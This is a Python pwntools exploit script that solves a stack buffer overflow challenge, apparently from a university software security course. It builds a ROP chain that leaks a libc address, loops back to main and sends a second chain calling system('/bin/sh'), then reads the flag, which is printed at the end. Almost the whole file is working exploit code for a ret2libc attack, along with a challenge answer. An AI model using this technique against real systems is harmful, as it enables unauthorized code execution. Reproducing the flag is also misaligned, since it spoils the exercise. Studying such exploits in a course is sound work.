from pwn import *
import string
from sys import argv
import os
import time
import subprocess

context.arch = 'amd64'
context.os = 'linux'
info = log.info
#context.log_level = 'debug'

binfile = './vuln'
elf = context.binary = ELF(binfile)


# for debugging
gdbscript = '''
file vuln
#b *(main+18)
'''.format(**locals())
#p = gdb.debug(["./vuln"], gdbscript=gdbscript, )
with open("gdbscript", "w") as f:
    f.write(gdbscript)


#p=remote("127.0.0.1", 1024)
#p2=process('tmux split-window -h gdb -x gdbscript -p $(pgrep -n vuln)', shell=True)
#sleep(1)


# start remote
p = remote('tasks.ws24.softsec.rub.de', 33288)

def cyclic_find_bytes(b):
    to_be_found = bytes.fromhex(hex(b)[2:])[::-1]
    return cyclic_find(to_be_found)




rop = ROP(binfile)
rop.raw(pack(rop.rdi.address))
rop.raw(pack(1)) # stdout
rop.raw(pack(rop.rsi.address))
rop.raw(pack(0x0041bf60)) #PTR___libc_start_main
rop.raw(pack(rop.rdx.address))
rop.raw(pack(8)) #read 8 bytes
rop.raw(pack(rop.rdx.address))
rop.raw(pack(8)) #read 8 bytes
rop.raw(pack(0x00401060)) # write function
# create a loop back into main for a second round (I don't care where exactly I need to write the ret address since I will end with a fresh stack frame anyway)
rop.raw(pack(elf.symbols['main']))
rop.raw(pack(elf.symbols['main']))
rop.raw(pack(elf.symbols['main']))
rop.raw(pack(elf.symbols['main']))
rop.raw(pack(elf.symbols['main']))
rop.raw(pack(elf.symbols['main']))
rop.raw(pack(elf.symbols['main']))
rop.raw(pack(elf.symbols['main']))
rop.raw(pack(elf.symbols['main']))
rop.raw(pack(elf.symbols['main']))
rop.raw(pack(elf.symbols['main']))
rop.raw(pack(elf.symbols['main']))
rop.raw(pack(elf.symbols['main']))
rop.raw(pack(elf.symbols['main']))
rop.raw(pack(elf.symbols['main']))
rop.raw(pack(elf.symbols['main']))
rop.raw(pack(elf.symbols['main']))



print(disasm(rop.chain()))


#p.sendline(cyclic(40))
#p.interactive()
payload = b"A"*cyclic_find_bytes(0x61616167)
payload += rop.chain()
p.sendline(payload)

leak = p.recvn(8)
libc_addr = int.from_bytes(leak[::-1]) - 0x98e30
print(hex(libc_addr))

libc = ELF("./libc.so.6")
libc.address = libc_addr

rop = ROP(libc)
rop.raw(0x00401172) # address of "ret" instruction
rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh'))])
payload2 = b"A"*cyclic_find_bytes(0x61616167)
payload2 += rop.chain()
p.sendline(payload2)

# see outputted flag
p.sendline(b"cat /flag")
p.interactive()

#softsec{kxTMmSmrMIBNvtQzakjyJCej8JE5qY_ueIeyMo9njN0zZbESYG02tNpoIdHG0PWg}